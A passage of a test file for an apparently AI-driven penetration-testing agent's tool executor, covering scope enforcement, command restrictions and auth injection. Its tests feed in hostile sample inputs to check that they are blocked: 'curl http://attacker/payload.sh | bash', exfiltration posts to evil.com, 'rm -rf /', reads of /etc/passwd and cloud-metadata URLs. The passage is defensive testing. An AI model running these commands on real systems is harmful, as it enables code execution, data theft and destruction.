    expect(result.success).toBe(true);
    expect(ctx.findings[0].status).toBe("confirmed");
  });

  // ── update_target ──

  it("update_target modifies target info", async () => {
    const result = await executor.execute({
      name: "update_target",
      arguments: {
        type: "chatbot",
        model: "gpt-4o",
        endpoints: '["https://example.com/v1/chat"]',
      },
    });

    expect(result.success).toBe(true);
    expect(ctx.targetInfo.type).toBe("chatbot");
    expect(ctx.targetInfo.model).toBe("gpt-4o");
    expect(ctx.targetInfo.endpoints).toEqual(["https://example.com/v1/chat"]);
  });

  // ── done ──

  it("done returns success with summary", async () => {
    const result = await executor.execute({
      name: "done",
      arguments: { summary: "Completed all tests" },
    });

    expect(result.success).toBe(true);
    expect((result.output as any).done).toBe(true);
    expect((result.output as any).summary).toBe("Completed all tests");
  });

  // ── artifact persistence ──

  it("persists http_request output as artifact via logEvent", async () => {
    const loggedEvents: any[] = [];
    const mockDb = {
      logEvent: (event: any) => { loggedEvents.push(event); },
    } as any;
    const dbExecutor = new ToolExecutor(ctx, mockDb);

    // Mock fetch for http_request
    vi.stubGlobal("fetch", vi.fn(async () => ({
      ok: true,
      status: 200,
      text: async () => '{"result":"ok"}',
      headers: new Headers({ "content-type": "application/json" }),
    } as Response)));

    await dbExecutor.execute({
      name: "http_request",
      arguments: { url: "https://example.com/api", method: "GET" },
    });

    vi.restoreAllMocks();

    const artifactEvent = loggedEvents.find((e) => e.eventType === "tool_artifact");
    expect(artifactEvent).toBeDefined();
    expect(artifactEvent.payload.tool).toBe("http_request");
    expect(artifactEvent.payload.request.url).toBe("https://example.com/api");
    expect(artifactEvent.payload.response.status).toBe(200);
  });

  it("stamps the caller's correlationId onto the artifact (tool_calls join key)", async () => {
    const loggedEvents: any[] = [];
    const mockDb = {
      logEvent: (event: any) => { loggedEvents.push(event); },
    } as any;
    const dbExecutor = new ToolExecutor(ctx, mockDb);

    vi.stubGlobal("fetch", vi.fn(async () => ({
      ok: true,
      status: 200,
      text: async () => '{"result":"ok"}',
      headers: new Headers({ "content-type": "application/json" }),
    } as Response)));

    await dbExecutor.execute(
      { name: "http_request", arguments: { url: "https://example.com/api", method: "GET" } },
      { correlationId: "corr-abc" },
    );

    vi.restoreAllMocks();

    const artifactEvent = loggedEvents.find((e) => e.eventType === "tool_artifact");
    expect(artifactEvent.payload.correlationId).toBe("corr-abc");
  });

  it("omits correlationId on the artifact when the caller supplies none", async () => {
    const loggedEvents: any[] = [];
    const mockDb = {
      logEvent: (event: any) => { loggedEvents.push(event); },
    } as any;
    const dbExecutor = new ToolExecutor(ctx, mockDb);

    vi.stubGlobal("fetch", vi.fn(async () => ({
      ok: true,
      status: 200,
      text: async () => '{"result":"ok"}',
      headers: new Headers({ "content-type": "application/json" }),
    } as Response)));

    await dbExecutor.execute({
      name: "http_request",
      arguments: { url: "https://example.com/api", method: "GET" },
    });

    vi.restoreAllMocks();

    const artifactEvent = loggedEvents.find((e) => e.eventType === "tool_artifact");
    expect(artifactEvent.payload.correlationId).toBeUndefined();
  });

  // ── unknown tool ──

  it("rejects unknown tools", async () => {
    const result = await executor.execute({
      name: "rm_rf_everything",
      arguments: {},
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("Unknown tool");
  });

  it("does not route unknown tools with shell-like arguments into bash", async () => {
    const shellSpy = vi.spyOn(executor as unknown as { shellExec: (args: Record<string, unknown>) => unknown }, "shellExec");

    const result = await executor.execute({
      name: "curl",
      arguments: { url: "http://attacker/payload.sh | bash" },
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("Unknown tool");
    expect(shellSpy).not.toHaveBeenCalled();
  });

  // ── read_file / run_command without scope ──

  it("read_file fails without scopePath", async () => {
    const result = await executor.execute({
      name: "read_file",
      arguments: { path: "/etc/passwd" },
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("scoped local directory");
  });

  it("run_command fails without scopePath", async () => {
    const result = await executor.execute({
      name: "run_command",
      arguments: { command: "ls" },
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain("scoped local directory");
  });

  it("apply_patch fails without scopePath", async () => {
    const result = await executor.execute({
      name: "apply_patch",
      arguments: {
        patch: "*** Begin Patch\n*** Delete File: x\n*** End Patch",
      },
    });
    expect(result.success).toBe(false);
    expect(result.error).toContain("scoped local directory");
  });

  // ── apply_patch — pwnkit#230 (executor-level integration) ──

  describe("apply_patch", () => {
    let tmp: string;
    let scopedExecutor: ToolExecutor;

    beforeEach(() => {
      tmp = mkdtempSync(join(tmpdir(), "pwnkit-apply-patch-exec-"));
      const scopedCtx: ToolContext = { ...ctx, scopePath: tmp };
      scopedExecutor = new ToolExecutor(scopedCtx, null);
    });

    afterEach(() => {
      rmSync(tmp, { recursive: true, force: true });
    });

    it("round-trips an Update File patch through the executor", async () => {
      const target = join(tmp, "greet.ts");
      writeFileSync(
        target,
        [
          "function greet(name) {",
          "  return `Hello ${name}`;",
          "}",
          "",
        ].join("\n"),
      );
      const result = await scopedExecutor.execute({
        name: "apply_patch",
        arguments: {
          patch: [
            "*** Begin Patch",
            "*** Update File: greet.ts",
            "@@ function greet",
            " function greet(name) {",
            "-  return `Hello ${name}`;",
            "+  return `Hi ${name}!`;",
            " }",
            "*** End Patch",
          ].join("\n"),
        },
      });
      expect(result.success).toBe(true);
      expect((result.output as { applied: unknown[] }).applied).toEqual([
        { kind: "update", path: "greet.ts" },
      ]);
      expect(readFileSync(target, "utf-8")).toBe(
        ["function greet(name) {", "  return `Hi ${name}!`;", "}", ""].join("\n"),
      );
    });

    it("fails loudly on ambiguous context", async () => {
      const target = join(tmp, "dup.ts");
      writeFileSync(target, ["x", "x", "x", ""].join("\n"));
      const result = await scopedExecutor.execute({
        name: "apply_patch",
        arguments: {
          patch: [
            "*** Begin Patch",
            "*** Update File: dup.ts",
            "@@ x",
            "-x",
            "+y",
            "*** End Patch",
          ].join("\n"),
        },
      });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(
        /context "x" matches 3 locations in dup\.ts; refine the @@ anchor/,
      );
      // File untouched.
      expect(readFileSync(target, "utf-8")).toBe(
        ["x", "x", "x", ""].join("\n"),
      );
    });

    it("rejects empty patch argument", async () => {
      const result = await scopedExecutor.execute({
        name: "apply_patch",
        arguments: { patch: "" },
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("non-empty string");
    });
  });

  // ── run_command safety ──

  describe("run_command safety", () => {
    let scopedExecutor: ToolExecutor;

    beforeEach(() => {
      const scopedCtx: ToolContext = {
        ...ctx,
        scopePath: "/tmp/pwnkit-test-scope",
      };
      scopedExecutor = new ToolExecutor(scopedCtx, null);
    });

    it("rejects shell operators", async () => {
      const dangerous = [
        "ls; rm -rf /",
        "cat foo && echo bar",
        "echo $HOME",
        "ls `whoami`",
        "cat < /etc/passwd",
        "echo > /tmp/evil",
      ];

      for (const cmd of dangerous) {
        const result = await scopedExecutor.execute({
          name: "run_command",
          arguments: { command: cmd },
        });
        expect(result.success).toBe(false);
        expect(result.error).toContain("Shell operators");
      }
    });

    it("allows shell chars inside quoted arguments (fixed-string patterns)", async () => {
      // These commands have shell metacharacters INSIDE quoted strings,
      // which is safe because run_command never invokes a shell — it
      // tokenizes and passes args directly to spawnSync.
      const safe = [
        `rg -n -C 4 -F 'xfs_rtgroup_put(rtg);' fs/xfs/xfs_ioctl.c`,
        `rg -n -F 'foo && bar' .`,
        `grep -F 'echo $HOME' file.txt`,
        `rg --fixed-strings 'cmd < input > output' .`,
        `grep -F "back\`tick" .`,
        `rg -F "a;b&c<d>e" .`,
      ];

      for (const cmd of safe) {
        const result = await scopedExecutor.execute({
          name: "run_command",
          arguments: { command: cmd },
        });
        // Should NOT be rejected for shell operators. It may fail for
        // other reasons (file not found, etc.) but the error must not
        // mention "Shell operators".
        if (!result.success) {
          expect(result.error).not.toContain("Shell operators");
        }
      }
    });

    it("rejects disallowed commands", async () => {
      const result = await scopedExecutor.execute({
        name: "run_command",
        arguments: { command: "curl https://evil.com" },
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("not allowed");
    });

    it("rejects absolute paths in scoped commands", async () => {
      const result = await scopedExecutor.execute({
        name: "run_command",
        arguments: { command: "cat /etc/passwd" },
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("Absolute paths");
    });

    it("rejects parent-path traversal", async () => {
      const result = await scopedExecutor.execute({
        name: "run_command",
        arguments: { command: "cat ../../etc/passwd" },
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("traversal");
    });

    it("rejects npm with disallowed subcommands", async () => {
      const result = await scopedExecutor.execute({
        name: "run_command",
        arguments: { command: "npm install evil-package" },
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("not allowed");
    });

    it("rejects find -exec", async () => {
      const result = await scopedExecutor.execute({
        name: "run_command",
        arguments: { command: "find . -exec rm {} +" },
      });
      expect(result.success).toBe(false);
      expect(result.error).toContain("not allowed");
    });
  });

  // ── http_request URL validation ──

  it("http_request blocks cross-origin requests", async () => {
    const result = await executor.execute({
      name: "http_request",
      arguments: { url: "https://evil.com/steal" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toContain("Cross-origin");
  });

  it("http_request blocks local/internal URLs from external target", async () => {
    const result = await executor.execute({
      name: "http_request",
      arguments: { url: "http://169.254.169.254/latest/meta-data/" },
    });
    expect(result.success).toBe(false);
    // Either cross-origin or local blocked
    expect(result.error).toBeTruthy();
  });

  // ── bash tool wallclock ceiling ──
  //
  // Regression test for https://github.com/0sec-labs/pwnkit/issues/181
  // A hung subprocess (canonical case: `python3 -c 'requests.post(…)'` with
  // no timeout) used to wedge the tool indefinitely. The wallclock ceiling
  // must reap the process group and return an `is_error`-shaped result.

  describe("bash wallclock ceiling", () => {
    const ORIGINAL_TIMEOUT_MS = process.env.PWNKIT_BASH_TIMEOUT_MS;

    beforeEach(() => {
      // 1.5s ceiling so the test runs fast.
      process.env.PWNKIT_BASH_TIMEOUT_MS = "1500";
    });

    afterEach(() => {
      if (ORIGINAL_TIMEOUT_MS === undefined) delete process.env.PWNKIT_BASH_TIMEOUT_MS;
      else process.env.PWNKIT_BASH_TIMEOUT_MS = ORIGINAL_TIMEOUT_MS;
    });

    it("kills a hanging subprocess and returns a timeout error", async () => {
      const start = Date.now();
      const result = await executor.execute({
        name: "bash",
        // `sleep` does not fork further, so this exercises the basic
        // SIGTERM-the-process-group path. The grandchild-survives case is
        // covered by the next test.
        arguments: { command: "sleep 30" },
      });
      const elapsed = Date.now() - start;

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/bash tool timed out after \d+s/);
      expect(result.error).toContain("PWNKIT_BASH_TIMEOUT_MS=1500");
      // Ceiling 1.5s + 2s SIGKILL grace + slack — must be much less than
      // the requested 30s sleep, proving the subprocess was actually reaped.
      expect(elapsed).toBeLessThan(8_000);
    }, 15_000);

    it("reaps a forked grandchild that holds the stdout pipe", async () => {
      // Reproduces the original bug shape: a python subprocess that ignores
      // SIGTERM on the parent shell would keep stdout open and wedge
      // execSync. With the new spawn-detached + process-group kill, the
      // grandchild is in the same group and dies too.
      const start = Date.now();
      const result = await executor.execute({
        name: "bash",
        arguments: {
          command:
            "python3 -c 'import time, signal; signal.signal(signal.SIGTERM, signal.SIG_IGN); time.sleep(30)'",
        },
      });
      const elapsed = Date.now() - start;

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/bash tool timed out/);
      // Ceiling 1.5s + 2s grace before SIGKILL + slack.
      expect(elapsed).toBeLessThan(8_000);
    }, 15_000);

    it("returns successful output for fast-completing commands", async () => {
      const result = await executor.execute({
        name: "bash",
        arguments: { command: "echo hello-from-bash-tool" },
      });
      expect(result.success).toBe(true);
      expect(result.output).toContain("hello-from-bash-tool");
    });

    it("preserves non-zero exit output (pentesting tools often exit non-zero on findings)", async () => {
      const result = await executor.execute({
        name: "bash",
        arguments: { command: "echo finding && exit 2" },
      });
      expect(result.success).toBe(true);
      expect(result.output).toContain("finding");
    });
  });
});

// ── containsUnquotedShellChars ─────────────────────────────────────
//
// The shell-char validator must respect quoting so that search patterns
// containing `;`, `$`, `&`, etc. are not blocked when they appear inside
// single- or double-quoted strings. This is safe because `run_command`
// tokenizes the command itself and passes arguments directly to spawnSync
// (no shell involved).

describe("containsUnquotedShellChars", () => {
  it("detects unquoted semicolons", () => {
    expect(containsUnquotedShellChars("ls; rm -rf /")).toBe(true);
  });

  it("detects unquoted ampersands", () => {
    expect(containsUnquotedShellChars("cat foo && echo bar")).toBe(true);
  });

  it("detects unquoted dollar signs", () => {
    expect(containsUnquotedShellChars("echo $HOME")).toBe(true);
  });

  it("detects unquoted backticks", () => {
    expect(containsUnquotedShellChars("ls `whoami`")).toBe(true);
  });

  it("detects unquoted redirects", () => {
    expect(containsUnquotedShellChars("cat < /etc/passwd")).toBe(true);
    expect(containsUnquotedShellChars("echo > /tmp/evil")).toBe(true);
  });

  it("allows semicolons inside single quotes", () => {
    expect(containsUnquotedShellChars("rg -F 'xfs_rtgroup_put(rtg);' file.c")).toBe(false);
  });

  it("allows dollar signs inside single quotes", () => {
    expect(containsUnquotedShellChars("grep -F '$HOME' file.txt")).toBe(false);
  });

  it("allows multiple shell chars inside double quotes", () => {
    expect(containsUnquotedShellChars('rg -F "a;b&c<d>e" .')).toBe(false);
  });

  it("allows backticks inside double quotes", () => {
    expect(containsUnquotedShellChars('grep -F "back`tick" .')).toBe(false);
  });

  it("allows backslash-escaped shell chars outside quotes", () => {
    expect(containsUnquotedShellChars("rg foo\\;bar .")).toBe(false);
  });

  it("detects shell chars after a closing quote", () => {
    expect(containsUnquotedShellChars("rg 'safe'; evil")).toBe(true);
  });

  it("handles mixed quoting correctly", () => {
    // Single-quoted block with ;, then unquoted safe text
    expect(containsUnquotedShellChars(`rg -F 'foo;bar' . | head -5`)).toBe(false);
  });
});

// ── splitOnTopLevelPipes ───────────────────────────────────────────
//
// The naive `command.split("|")` corrupts any `|` that lives inside a
// quoted regex pattern — very common in the agent's grep/rg calls.
// Pin that the new splitter respects single + double quotes and
// backslash escapes the same way a POSIX shell does.

describe("splitOnTopLevelPipes", () => {
  it("splits on top-level pipes", async () => {
    const { splitOnTopLevelPipes } = await import("./tools.js");
    expect(splitOnTopLevelPipes("grep foo | head -5")).toEqual([
      "grep foo ",
      " head -5",
    ]);
  });

  it("does NOT split on a pipe inside a double-quoted string", async () => {
    const { splitOnTopLevelPipes } = await import("./tools.js");
    expect(
      splitOnTopLevelPipes('grep -n "module.exports|export default" lodash.js'),
    ).toEqual(['grep -n "module.exports|export default" lodash.js']);
  });

  it("does NOT split on a pipe inside a single-quoted string", async () => {
    const { splitOnTopLevelPipes } = await import("./tools.js");
    expect(
      splitOnTopLevelPipes("grep -n 'foo|bar|baz' file.js | wc -l"),
    ).toEqual(["grep -n 'foo|bar|baz' file.js ", " wc -l"]);
  });

  it("does NOT split on a backslash-escaped pipe", async () => {
    const { splitOnTopLevelPipes } = await import("./tools.js");
    expect(splitOnTopLevelPipes("grep foo\\|bar file.js")).toEqual([
      "grep foo\\|bar file.js",
    ]);
  });

  it("returns the input unchanged when there are no pipes", async () => {
    const { splitOnTopLevelPipes } = await import("./tools.js");
    expect(splitOnTopLevelPipes("grep foo file.js")).toEqual(["grep foo file.js"]);
  });
});

// ── Auth injection in shellExec (pwnkit#282) ────────────────────────
//
// `shellExec` historically only EXPOSED `$AUTH_HEADER` / `$AUTH_VALUE`
// / `$AUTH_CURL_FLAG` env vars and trusted the agent to interpolate
// them into curl/wget calls. After conversation compaction the model
// drops this affordance and sends unauthenticated requests for several
// turns. The fix injects these env vars into the bash command BEFORE
// exec, so unauth-by-omission is no longer possible against in-scope
// hosts. These tests pin the rewrite surface and the no-leak invariants.

describe("injectAuthIntoBashCommand (pwnkit#282)", () => {
  it("rewrites a bare curl invocation with $AUTH_CURL_FLAG when URL is in-scope", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const v = injectAuthIntoBashCommand("curl https://target.test/admin", scope);
    expect(v.kind).toBe("rewrite");
    if (v.kind === "rewrite") {
      expect(v.command).toContain("$AUTH_CURL_FLAG");
      expect(v.command).toContain("https://target.test/admin");
      // Env-var indirection ⇒ raw "Basic …" / token NEVER appears.
      expect(v.command).not.toMatch(/Basic [A-Za-z0-9+/=]+/);
    }
  });

  it("does NOT double-inject when curl already carries an Authorization header", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const v = injectAuthIntoBashCommand(
      "curl -H 'Authorization: Basic XYZ' https://target.test/admin",
      scope,
    );
    expect(v.kind).toBe("unchanged");
  });

  it("does NOT double-inject when curl uses --user / -u", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    expect(
      injectAuthIntoBashCommand("curl -u user:pass https://target.test/admin", scope).kind,
    ).toBe("unchanged");
    expect(
      injectAuthIntoBashCommand("curl --user user:pass https://target.test/admin", scope).kind,
    ).toBe("unchanged");
  });

  it("leaves out-of-scope URLs alone (no auth leak to non-engagement targets)", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const v = injectAuthIntoBashCommand("curl https://other.example/admin", scope);
    expect(v.kind).toBe("unchanged");
  });

  it("leaves non-HTTP commands (ls/echo/grep) unchanged", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    expect(injectAuthIntoBashCommand("ls -la", scope).kind).toBe("unchanged");
    expect(injectAuthIntoBashCommand("echo hello", scope).kind).toBe("unchanged");
    expect(injectAuthIntoBashCommand("grep foo file.js | wc -l", scope).kind).toBe("unchanged");
  });

  it("rewrites wget invocations with --header=\"$AUTH_HEADER: $AUTH_VALUE\"", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const v = injectAuthIntoBashCommand("wget https://target.test/api", scope);
    expect(v.kind).toBe("rewrite");
    if (v.kind === "rewrite") {
      expect(v.command).toContain("--header=\"$AUTH_HEADER: $AUTH_VALUE\"");
      expect(v.command).toContain("https://target.test/api");
    }
  });

  it("refuses Python `requests` invocations with a hint pointing at http_request", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const v = injectAuthIntoBashCommand(
      "python3 -c 'import requests; requests.get(\"https://target.test\")'",
      scope,
    );
    expect(v.kind).toBe("refuse");
    if (v.kind === "refuse") {
      expect(v.reason).toMatch(/http_request/);
      expect(v.reason).toMatch(/headers=/);
    }
  });

  it("refuses Python urllib.request and httpx the same way", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    expect(
      injectAuthIntoBashCommand(
        "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://target.test\")'",
        scope,
      ).kind,
    ).toBe("refuse");
    expect(
      injectAuthIntoBashCommand(
        "python3 -c 'import httpx; httpx.get(\"https://target.test\")'",
        scope,
      ).kind,
    ).toBe("refuse");
  });

  it("leaves Python alone when the call already passes headers=", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const v = injectAuthIntoBashCommand(
      "python3 -c 'import requests; requests.get(\"https://target.test\", headers={\"Authorization\": \"Basic xyz\"})'",
      scope,
    );
    expect(v.kind).toBe("unchanged");
  });

  it("never injects when scope is undefined (can't verify in-scope ⇒ don't leak)", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    expect(
      injectAuthIntoBashCommand("curl https://target.test/admin", undefined).kind,
    ).toBe("unchanged");
    expect(
      injectAuthIntoBashCommand("wget https://target.test/api", undefined).kind,
    ).toBe("unchanged");
  });

  it("rewrites a curl call mid-pipe when URL is in-scope", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const v = injectAuthIntoBashCommand(
      "echo go && curl https://target.test/api | jq .",
      scope,
    );
    expect(v.kind).toBe("rewrite");
    if (v.kind === "rewrite") {
      expect(v.command).toContain("$AUTH_CURL_FLAG");
      expect(v.command).toContain("| jq .");
    }
  });

  it("places the auth flag BEFORE the URL token in a curl invocation with -X/-d args", async () => {
    const { injectAuthIntoBashCommand } = await import("./tools.js");
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["target.test"] });
    const v = injectAuthIntoBashCommand(
      "curl -X POST -d foo=bar https://target.test/api",
      scope,
    );
    expect(v.kind).toBe("rewrite");
    if (v.kind === "rewrite") {
      const flagIdx = v.command.indexOf("$AUTH_CURL_FLAG");
      const urlIdx = v.command.indexOf("https://target.test/api");
      expect(flagIdx).toBeGreaterThan(0);
      expect(urlIdx).toBeGreaterThan(flagIdx);
    }
  });
});

// ── ToolExecutor.shellExec auth-injection wiring (pwnkit#282) ───────

describe("ToolExecutor — shellExec auth injection (pwnkit#282)", () => {
  it("does NOT touch the command when authConfig is unset", async () => {
    const ctx: ToolContext = {
      target: "https://target.test",
      scanId: "test-282-1",
      findings: [],
      attackResults: [],
      targetInfo: {},
    };
    const ex = new ToolExecutor(ctx, null);
    // `ls` is a no-op in any environment — this test only proves the
    // wiring doesn't error or rewrite when authConfig is absent.
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "ls /tmp >/dev/null && echo done" },
    });
    expect(result.success).toBe(true);
    expect(result.output).toContain("done");
  });

  it("refuses Python requests in shell mode when authConfig+scope are set", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const ctx: ToolContext = {
      target: "https://target.test",
      scanId: "test-282-2",
      findings: [],
      attackResults: [],
      targetInfo: {},
      authConfig: { type: "bearer", token: "deadbeef" },
      scope: ScopePolicy.fromJson({ in_scope: ["target.test"] }),
    };
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: {
        command: "python3 -c 'import requests; requests.get(\"https://target.test\")'",
      },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/http_request/);
  });
});

// ── Programmatic scope integration (pwnkit#215) ─────────────────────
//
// The DoD requires that out-of-scope URLs return as `ToolResult.error`
// at every chokepoint. These tests pin that behaviour at the surface
// the agent actually sees — `executor.execute({name: "http_request", ...})`
// with an out-of-scope URL must return `success: false` with a scope-
// flavoured error message. Same-origin enforcement remains in place,
// so we use a target whose origin matches the URL we're testing and
// check that scope is the layer doing the rejecting.

describe("ToolExecutor — scope enforcement (pwnkit#215)", () => {
  it("http_request returns ToolResult.error when target host is out of scope", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["api.example.com"] });
    const ctx: ToolContext = {
      target: "https://other.example.com",
      scanId: "test-scope-1",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
    };
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "http_request",
      arguments: { url: "https://other.example.com/" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/Scope violation/);
  });

  it("http_request succeeds when both target and URL are in scope", async () => {
    // pwnkit#218 review: stub `fetch` so this test exercises only the
    // scope gate — the previous version relied on real DNS/network
    // behaviour for `api.example.com` and could sit on http_request's
    // 30s timeout before failing. The stub returns a minimal
    // Response-like object that satisfies the tool's body/header reads.
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["api.example.com"] });
    const ctx: ToolContext = {
      target: "https://api.example.com",
      scanId: "test-scope-2",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
    };
    const fetchStub = vi.fn(async (_url: string) => ({
      ok: true,
      status: 200,
      url: "https://api.example.com/health",
      headers: new Headers({ "content-type": "text/plain" }),
      text: async () => "ok",
      json: async () => ({}),
    }));
    vi.stubGlobal("fetch", fetchStub);
    try {
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "http_request",
        arguments: { url: "https://api.example.com/health" },
      });
      // Stubbed fetch always succeeds, so the scope gate is what we're
      // really asserting here — but if a future refactor changes the
      // failure shape, still assert it's NOT a scope error.
      if (!result.success) {
        expect(result.error).not.toMatch(/Scope violation/);
      } else {
        expect(fetchStub).toHaveBeenCalled();
      }
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("crawl returns ToolResult.error when start URL is out of scope", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["api.example.com"] });
    const ctx: ToolContext = {
      target: "https://api.example.com",
      scanId: "test-scope-3",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
    };
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "crawl",
      arguments: { url: "https://evil.com/" },
    });
    expect(result.success).toBe(false);
    // The crawl resolves the URL against `target` first, so the URL
    // we pass is rejected either by same-origin OR by scope. Either is
    // a correct hard-fail; just make sure it's NOT silently accepted.
    expect(result.error).toBeTruthy();
  });

  it("bash refuses when the command embeds an out-of-scope URL", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({
      in_scope: ["*.example.com"],
      out_of_scope: ["evil.com"],
    });
    const ctx: ToolContext = {
      target: "https://api.example.com",
      scanId: "test-scope-4",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
    };
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "curl -X POST https://evil.com/exfil" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/out-of-scope URL/);
    expect(result.error).toMatch(/evil\.com/);
  });

  it("bash blocks even when the bad URL is the second of several", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({
      in_scope: ["*.example.com"],
      out_of_scope: ["evil.com"],
    });
    const ctx: ToolContext = {
      target: "https://api.example.com",
      scanId: "test-scope-5",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
    };
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: {
        command: "curl https://api.example.com/ && curl https://evil.com/x",
      },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/evil\.com/);
  });
});

// pwnkit#133. The guards above all live inside `if (this.ctx.scope)`, and
// `ctx.scope` is undefined on every local run without `--scope` and on every
// cloud scan mode except http_audit. That is not going to change (fail-closed
// by default would break every shipping mode), so the requirement is that the
// absence is never SILENT: an unscoped bash command that reaches the network
// must leave a `scope_guards_inert` record in the scan event log, and
// PWNKIT_REQUIRE_SCOPE=1 must turn it into a refusal.
//
// These tests fail if someone deletes the signal.

describe("ToolExecutor — unscoped bash egress is visible (pwnkit#133)", () => {
  const ORIGINAL_REQUIRE_SCOPE = process.env.PWNKIT_REQUIRE_SCOPE;

  afterEach(() => {
    if (ORIGINAL_REQUIRE_SCOPE === undefined) delete process.env.PWNKIT_REQUIRE_SCOPE;
    else process.env.PWNKIT_REQUIRE_SCOPE = ORIGINAL_REQUIRE_SCOPE;
  });

  function unscopedCtx(): ToolContext {
    return {
      target: "https://api.example.com",
      scanId: `test-scope-guard-${Math.random().toString(36).slice(2)}`,
      findings: [],
      attackResults: [],
      targetInfo: {},
      // scope intentionally absent — this is the cloud-scan shape.
    };
  }

  it("records a scope_guards_inert artifact when an unscoped bash command carries a URL", async () => {
    const loggedEvents: any[] = [];
    const db = { logEvent: (event: any) => { loggedEvents.push(event); } } as any;
    const ex = new ToolExecutor(unscopedCtx(), db);

    // `echo` does not egress, so this test never touches the network — but the
    // URL is statically visible, which is exactly the case the (inert) scope
    // grep would have inspected.
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "echo https://exfil.example.net/beacon" },
    });
    expect(result.success).toBe(true);

    const inert = loggedEvents.find(
      (e) => e.eventType === "tool_artifact" && e.payload?.scope_guards === "inert",
    );
    expect(inert).toBeDefined();
    expect(inert.payload.tool).toBe("bash");
    expect(inert.payload.unscoped_egress_urls).toContain("https://exfil.example.net/beacon");
    // The named guards must be in the payload — that list is what makes the
    // event answer "which checks did NOT run?" after the fact.
    expect(inert.payload.inert_guards.length).toBeGreaterThan(0);
    expect(inert.payload.inert_guards).toContain("bash_out_of_scope_url_refusal");
  });

  it("stays quiet for unscoped bash that never reaches the network", async () => {
    const loggedEvents: any[] = [];
    const db = { logEvent: (event: any) => { loggedEvents.push(event); } } as any;
    const ex = new ToolExecutor(unscopedCtx(), db);

    await ex.execute({ name: "bash", arguments: { command: "echo hello" } });

    expect(
      loggedEvents.find((e) => e.payload?.scope_guards === "inert"),
    ).toBeUndefined();
  });

  it("does not fire the signal when a scope IS configured (guards ran)", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const loggedEvents: any[] = [];
    const db = { logEvent: (event: any) => { loggedEvents.push(event); } } as any;
    const ex = new ToolExecutor(
      { ...unscopedCtx(), scope: ScopePolicy.fromJson({ in_scope: ["*.example.com"] }) },
      db,
    );

    await ex.execute({
      name: "bash",
      arguments: { command: "echo https://api.example.com/ok" },
    });

    expect(
